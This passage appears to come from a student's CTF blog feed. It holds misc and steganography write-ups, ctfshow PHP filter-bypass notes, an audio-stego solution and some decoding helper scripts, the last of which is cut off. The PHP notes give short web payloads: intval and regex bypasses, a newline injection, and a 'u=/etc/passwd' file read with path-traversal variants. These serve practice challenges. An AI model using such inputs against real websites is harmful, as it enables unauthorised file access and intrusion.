“flag”<br>追踪流<br><img src="https://img-blog.csdnimg.cn/93b79bcf426f402480e2b67787f66ee8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这次学聪明了，直接套上flag提交</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>那直接lsb<br><img src="https://img-blog.csdnimg.cn/34523b294c11405f937fc06250009878.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>save bin为png格式，得到二维码，扫码得flag</p><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><p>题目提示4位密码，直接archpr暴力破解<br>拿到flag</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p><img src="https://img-blog.csdnimg.cn/f5c3ea3149c24935a910198b053bb085.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目说了伪加密<br>直接把两个09改成00<br>得到flag</p><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><p>丢进wireshark，搜flag<br><code>tcp contains &quot;flag&quot;</code><br><img src="https://img-blog.csdnimg.cn/c44566aeef3a451580ee945c7bcef94a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>追踪流，应该是在上传一张图片<br>导出HTTP对象<br><img src="https://img-blog.csdnimg.cn/1d53ba1001e14381a172cc8819eccbb3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>有一个很大，打开就是正在上传的图片<br><img src="https://img-blog.csdnimg.cn/bc489631d4c5415aa09cbce1dc03019b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢进010editor，把文件头多余的部分删掉，得到图片<br>然后发现其实flag就在文件尾<br><img src="https://img-blog.csdnimg.cn/9cbf77f1021b4eacb343c7815fbe0c71.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>丢进010editor什么都没有<br>打开stegsolve<br>LSB<br><img src="https://img-blog.csdnimg.cn/116956150826470993a9e6ce3840c7a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>拿到flag</p><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><p>解码即可</p><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><p>文件尾发现zip，导出<br><img src="https://img-blog.csdnimg.cn/ff041372eaae4c46beff65e538f850fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>题目提示了4位密码<br>爆破得flag</p><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><p>文件尾发现rar<br><img src="https://img-blog.csdnimg.cn/0a79f464561e45f4a59c76d2874e41fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提示4位数字密码，爆破，得flag</p><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>文件尾发现zip<br>需要密码<br><img src="https://img-blog.csdnimg.cn/e708a3d977fd49c783a08b4698893833.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>好像是真加密（哈哈，下次好好研究一下）<br>密码在exif里面<br>解密得flag</p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>直接追踪流，flag就在里面</p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p><img src="https://img-blog.csdnimg.cn/da7399bf713b496195d344bf6c19e552.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>base64解密得flag</p><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p><img src="https://img-blog.csdnimg.cn/4156201184f44f75ac77f0aeee0277e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件尾有一串很奇怪的二进制，二进制转字符得flag<br>本来想如果不想再考虑培根、敲击码、博多码</p><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>010editor看什么都没有<br><img src="https://img-blog.csdnimg.cn/3b7eb90ea82b4187909bb7426dac68a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>得到zip<br>一个没有后缀名的文件<br><img src="https://img-blog.csdnimg.cn/90c9afd1ee174c9eaf024b01515e2c90.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>改后缀为elf<br>丢入exeinfo看下<br><img src="https://img-blog.csdnimg.cn/a923f0c671d44cdcaef2fdff34c3abfb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>丢入ida64<br><img src="https://img-blog.csdnimg.cn/4ba4eac2ac70480aad0677f2657cd564.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>拿到flag</p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p><img src="https://img-blog.csdnimg.cn/e20a9beb12ac4120a2bb2dd04367bed5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在stegsolve里看就觉得有点奇怪，再看原图，联想海伦凯勒，是盲文<br><img src="https://img-blog.csdnimg.cn/edad4b0946074f3db3d7fc7e830d4e3a.png" alt="在这里插入图片描述"><br><a href="https://www.cnblogs.com/gwind/p/8009861.html">https://www.cnblogs.com/gwind/p/8009861.html</a></p><p><code>kmdonowg</code><br>这就是压缩包的密码，解密得到wav<br>丢如Audicity<br><img src="https://img-blog.csdnimg.cn/6d5cc877699d498fb4533da85efca5b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>morse密码啊<br><img src="https://img-blog.csdnimg.cn/7c87aebdd2d642cd86dd169c45d97027.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>得到flag</p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>题目提示四位密码，archpr爆破<br><img src="https://img-blog.csdnimg.cn/33bf8ee7b7b440e09691b77923735862.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>真的是龙卷<img src="https://img-blog.csdnimg.cn/4f39a141f42944b09633f207d5ed3378.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>符合brainfuck特征，但是解密解不出来，看别人wp才知道，要跑这个brainfuck代码</p><p><img src="https://img-blog.csdnimg.cn/b2282935da11464aa1be15d071514005.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>运行网址：<a href="http://bf.doleczek.pl/">http://bf.doleczek.pl/</a></p><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>这一题我没有写出来，看了别人的wp<br>用webshell查杀工具D盾<br><img src="https://img-blog.csdnimg.cn/4153d758a8714204ab6ba6cf22dca6c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/77acfb952c514942bbf4e15b15d9f836.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>找到了flag</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>追踪了几个流看不出来什么<br>导出对象<img src="https://img-blog.csdnimg.cn/0cffd487585e40128fe1078c144f4e87.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件名fenxi<br>应该是base64<br><img src="https://img-blog.csdnimg.cn/36919853b87f4707a65233e1759ae741.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看到JIFF<br>base64转图片<br><img src="https://img-blog.csdnimg.cn/3033f11a8508438daf973d613e368776.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>这一题给出的是.bin文件，wireshark打不开<br>.bin文件是路由器配置文件<br><a href="https://www.xinsaisai.com/router-pppoe-password-view.html">路由器宽带配置文件知识点</a></p><p>需要下载个软件RouterPassView<br><a href="http://file.xinsaisai.com/201508/RouterPassView_1.45.zip">点击下载</a></p><p>打开后搜索username即可</p><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p><img src="https://img-blog.csdnimg.cn/1f64852e009f45bc8694c0ba717e436b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>morse密码解码即可</p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p><img src="https://img-blog.csdnimg.cn/87363c9c39fd46168e85bb38723f35be.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>和后门查杀那一题一样</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>图片尾有个zip<br>zip里面有一个vmdk文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;如果大家有任何问题，都可以随时问我，我也是刚入坑不久的小白，大家共同进步&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 id=&quot;金三胖&quot;&gt;&lt;a href=&quot;#金三胖&quot; class=&quot;headerlink&quot; title=&quot;金三胖&quot;&gt;&lt;/a&gt;金</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow php特性</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/07/ctfshow-php%E7%89%B9%E6%80%A7/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/07/ctfshow-php%E7%89%B9%E6%80%A7/</id>
    <published>2022-03-07T12:58:37.000Z</published>
    <updated>2022-03-07T12:59:18.372Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>因为没钱充ctfshow会员，只能跟着视频教程白嫖</p></blockquote><h2 id="89"><a href="#89" class="headerlink" title="89"></a>89</h2><p><img src="https://img-blog.csdnimg.cn/4c3b3e828f944a07b8fc23db9c4e0e83.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>intval绕过<br>提交一个不为空的数组即可绕过<br><code>?num[]=         //就直接绕过了</code><br><a href="https://www.runoob.com/php/php-intval-function.html">intval详解</a></p><h2 id="90"><a href="#90" class="headerlink" title="90"></a>90</h2><p><img src="https://img-blog.csdnimg.cn/797769d0ef8245c5aadba628170c4681.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进制转换直接绕过<br><code>?num=0x117c</code></p><h2 id="91"><a href="#91" class="headerlink" title="91"></a>91</h2><p><img src="https://img-blog.csdnimg.cn/5aa1719f84164a35b286d073804d7823.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><code>preg_match(&#39;/^php$/i&#39; , $a)</code><br>终于知道后面地i是什么意思了，是匹配模式<br>i是大小写，m是多行匹配</p><p><code>?cmd=%0aphp</code>    //通过换行来绕过<br><code>preg_match(&#39;/^php$/i&#39; , $a)</code>    //这个正则这匹配一行</p><h2 id="92"><a href="#92" class="headerlink" title="92"></a>92</h2><p><img src="https://img-blog.csdnimg.cn/72ef6e7ed988497aab8345e6d1255462.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>看intval的那个教程<br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p><p><code>?num=010574</code><br><code>?num=0x117c</code></p><h2 id="93"><a href="#93" class="headerlink" title="93"></a>93</h2><p><img src="https://img-blog.csdnimg.cn/a7a981d3434648ce96434c6c4602ca55.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>字母被ban了<br><code>?num=010574</code></p><h2 id="94"><a href="#94" class="headerlink" title="94"></a>94</h2><p><img src="https://img-blog.csdnimg.cn/546bbe228c8f4eeba7be6db7d3f9f593.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>strpos() 函数查找字符串在另一字符串中第一次出现的位置。<br>所以num中肯定要存在0，但不能是第一个<br><code>num=4476.0</code></p><h2 id="95"><a href="#95" class="headerlink" title="95"></a>95</h2><p><img src="https://img-blog.csdnimg.cn/8a2826191b4843a09db096cf00ed3fd0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><code>num=_010574</code>    //010574是4476八进制形式，因为要有0，但是这个不行<br>intval(_010574)  ===  4476 没过</p><p><code>num=+010574</code> //过了<br>对加号进行编码，也行<br><code>num=%27010574</code><br>空格也是可以的<br><code>num= 010574</code><br><code>num=%20010574</code><br>空格进行编码也可以</p><h2 id="96"><a href="#96" class="headerlink" title="96"></a>96</h2><p><img src="https://img-blog.csdnimg.cn/35493138817c431c919bc88f49e12b69.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <code>u=/etc/passwd</code>   //可以读文件<br> 就是你要找到flag.php的位置<br> <code>u=./flag.php</code><br>  <code>u=/var/www/html/flag.php</code>    //看报错得到这个绝对路径<br>      <code>u=/var/www/html/../html/flag.php</code> </p><h2 id="97"><a href="#97" class="headerlink" title="97"></a>97</h2><p><img src="https://img-blog.csdnimg.cn/dea8a3bce4c0410e8ce49c6b67f7bf47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>传数组<br><code>a[]=1&amp;b[]=2</code></p><h2 id="98"><a href="#98" class="headerlink" title="98"></a>98</h2><p><img src="https://img-blog.csdnimg.cn/9e274712797e4886921b2639fa22800a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5byA5b-D5pif5Lq6,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;因为没钱充ctfshow会员，只能跟着视频教程白嫖&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;89&quot;&gt;&lt;a href=&quot;#89&quot; class=&quot;headerlink&quot; title=&quot;89&quot;&gt;&lt;/a&gt;89&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>misc音频题目</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/27/misc%E9%9F%B3%E9%A2%91%E9%A2%98%E7%9B%AE/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/27/misc%E9%9F%B3%E9%A2%91%E9%A2%98%E7%9B%AE/</id>
    <published>2022-02-27T02:55:29.000Z</published>
    <updated>2022-02-27T03:11:42.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h1><p>给了一个out.wav，音频和频谱图什么都看不出来<br>是音频隐写的题目<br>steghide （这个工具即可音频隐写也可以图片隐写）（kali自带）</p><p><code>steghide extract -sf out.wav</code><br>无密码，提取得到一个txt文件：<a href="https://share.weiyun.com/5wVTIN3">https://share.weiyun.com/5wVTIN3</a><br>得到一张图片，文件头错了，修一下<br>得到<code>\u0034\u0030\u0037\u0030\u000d\u000a\u0031\u0032\u0033\u0034\u000d\u000a</code></p><p>Unicode解码得到<br><img src="/picture/misc69.png"><br>所以flag为flag{5304}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GUET-CTF2019-soul-sipse&quot;&gt;&lt;a href=&quot;#GUET-CTF2019-soul-sipse&quot; class=&quot;headerlink&quot; title=&quot;[GUET-CTF2019]soul sipse&quot;&gt;&lt;/a&gt;[GUET-CTF2019]so</summary>
      
    
    
    
    
    <category term="misc" scheme="https://zhangkaibin0921.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>常见脚本</title>
    <link href="https://zhangkaibin0921.github.io/2022/02/27/%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC/"/>
    <id>https://zhangkaibin0921.github.io/2022/02/27/%E5%B8%B8%E8%A7%81%E8%84%9A%E6%9C%AC/</id>
    <published>2022-02-27T01:43:56.000Z</published>
    <updated>2022-03-10T08:28:58.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="base一把梭"><a href="#base一把梭" class="headerlink" title="base一把梭"></a>base一把梭</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">baseDec</span>(<span class="hljs-params">text,<span class="hljs-built_in">type</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> base64.b16decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> base64.b32decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> base64.b64decode(text)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span> == <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> base64.b85decode(text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">detect</span>(<span class="hljs-params">text</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">&quot;^[0-9A-F=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">&quot;^[A-Z2-7=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> re.match(<span class="hljs-string">&quot;^[A-Za-z0-9+/=]+$&quot;</span>,text.decode()) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">autoDec</span>(<span class="hljs-params">text</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;MRCTF&#123;&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>+text.decode())<br>            <span class="hljs-keyword">break</span><br><br>        code = detect(text)<br>        text = baseDec(text,code)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br><br>autoDec(flag)<br><br></code></pre></td></tr></table></figure><h1 id="0、1转二维码"><a href="#0、1转二维码" class="headerlink" title="0、1转二维码"></a>0、1转二维码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> zlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-built_in">str</span> =<span class="hljs-string">&quotquot;</span><br>lens=<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)<br><br>MAX = gmpy2.iroot(lens,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))<br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>            pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">else</span>:pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>        i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="翻转文件十六进制"><a href="#翻转文件十六进制" class="headerlink" title="翻转文件十六进制"></a>翻转文件十六进制</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;E:/ctf/ctfshow/misc/stega10/n/n.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>res = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;E:/ctf/ctfshow/misc/stega10/n/n2.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>res.write(f[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="多行base密文解密"><a href="#多行base密文解密" class="headerlink" title="多行base密文解密"></a>多行base密文解密</h1><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 